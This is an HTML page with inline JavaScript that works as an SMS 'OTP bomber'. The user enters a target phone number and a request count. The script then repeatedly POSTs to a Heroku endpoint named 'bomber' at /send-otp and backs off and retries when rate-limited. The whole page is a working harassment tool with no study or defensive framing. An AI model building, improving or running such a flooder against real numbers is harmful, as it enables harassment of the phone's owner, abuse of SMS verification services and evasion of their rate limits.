<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send OTP Requests</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .container {
            background-color: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            text-align: center;
            animation: fadeIn 1s ease-in-out;
        }

        h2 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #333;
        }

        .input-field {
            margin-bottom: 20px;
            position: relative;
        }

        .input-field input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        .input-field input:focus {
            border-color: #007BFF;
            outline: none;
        }

        .button {
            width: 100%;
            padding: 15px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.3s;
        }

        .button:hover {
            background-color: #0056b3;
            transform: translateY(-2px);
        }

        .message {
            margin-top: 20px;
            font-size: 16px;
            color: #333;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Send OTP Requests</h2>
        <div class="input-field">
            <input type="text" id="phone_number" placeholder="Enter Phone Number">
        </div>
        <div class="input-field">
            <input type="number" id="num_requests" placeholder="Number of Requests" value="10">
        </div>
        <button class="button" onclick="sendRequests()">Send OTP</button>
        <div class="message" id="message"></div>
    </div>

    <script>
        async function sendRequest(phoneNumber, retryCount = 0) {
            if (retryCount === 0) {
                await new Promise(resolve => setTimeout(resolve, 5000)); // 5 seconds delay for the first request
            }

            const response = await fetch("https://bomber-688c1b05cade.herokuapp.com/send-otp", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ phone_number: phoneNumber })
            });

            if (response.status === 429) {
                if (retryCount >= 5) {
                    throw new Error('Rate limit exceeded, retries exhausted');
                }
                const retryAfter = Math.pow(2, retryCount) * 5000; // Exponential backoff: 5s, 10s, 20s, etc.
                console.log(`Rate limit exceeded, retrying in ${retryAfter / 1000} seconds...`);
                await new Promise(resolve => setTimeout(resolve, retryAfter));
                return sendRequest(phoneNumber, retryCount + 1);
            }
            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`Network response was not ok: ${response.status} - ${errorText}`);
            }
            return await response.json();
        }

        async function sendRequests() {
            const phoneNumber = document.getElementById('phone_number').value;
            const numRequests = document.getElementById('num_requests').value;

            if (!phoneNumber) {
                alert("Please enter a phone number");
                return;
            }

            const messageDiv = document.getElementById('message');
            messageDiv.innerHTML = "Sending requests...";

            let successCount = 0;
            for (let i = 0; i < numRequests; i++) {
                try {
                    const result = await sendRequest(phoneNumber, i === 0 ? 0 : -1); // Only delay the first request
                    successCount++;
                    console.log(result);
                    messageDiv.innerHTML = `Requests sent successfully! (${successCount}/${numRequests})`;
                } catch (error) {
                    console.error(error);
                    messageDiv.innerHTML = `An error occurred after sending ${successCount} requests: ${error.message}`;
                    break;
                }
            }

            if (successCount === numRequests) {
                messageDiv.innerHTML = `All ${numRequests} requests sent successfully!`;
            }
        }
    </script>
</body>
</html>
